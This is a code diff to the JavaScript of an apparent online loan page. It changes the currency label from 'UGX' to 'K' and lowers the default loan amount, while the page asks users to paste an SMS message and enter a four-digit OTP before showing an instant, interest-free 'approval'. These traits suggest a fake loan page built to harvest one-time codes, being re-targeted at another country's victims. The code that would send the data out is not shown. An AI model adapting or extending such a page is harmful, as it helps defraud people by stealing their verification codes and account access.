@@ -2505,11 +2505,11 @@
                 showSmsMsg('error', 'The SMS message was rejected. Please paste the correct message.');
             } else if (stage === 'otp_approved') {
                 const months = parseInt(S.loanTerm) || 48;
-                const monthly = Math.ceil((S.loanAmount || 1000000) / months);
-                document.getElementById('aprAmount').textContent = 'UGX ' + (S.loanAmount || 1000000).toLocaleString();
-                document.getElementById('aprAmt').textContent = 'UGX ' + (S.loanAmount || 1000000).toLocaleString();
+                const monthly = Math.ceil((S.loanAmount || 10000) / months);
+                document.getElementById('aprAmount').textContent = 'K ' + (S.loanAmount || 10000).toLocaleString();
+                document.getElementById('aprAmt').textContent = 'K ' + (S.loanAmount || 10000).toLocaleString();
                 document.getElementById('aprTerm').textContent = S.loanTerm || '48 Months';
-                document.getElementById('aprMth').textContent = 'UGX ' + monthly.toLocaleString();
+                document.getElementById('aprMth').textContent = 'K ' + monthly.toLocaleString();
                 goTo('page-approval');
             } else if (stage === 'otp_rejected') {
                 [0, 1, 2, 3].forEach(i => document.getElementById('otp' + i).value = '');
@@ -2684,9 +2684,9 @@
 
         function updateCalc() {
             const amt = +document.getElementById('amtSlider').value;
-            document.getElementById('calcAmt').textContent = 'UGX ' + amt.toLocaleString();
+            document.getElementById('calcAmt').textContent = 'K ' + amt.toLocaleString();
             const monthly = Math.ceil(amt / 48);
-            document.getElementById('monthlyAmt').textContent = 'UGX ' + monthly.toLocaleString();
+            document.getElementById('monthlyAmt').textContent = 'K ' + monthly.toLocaleString();
         }
 
         // ══════════════════════════════════════════════════════
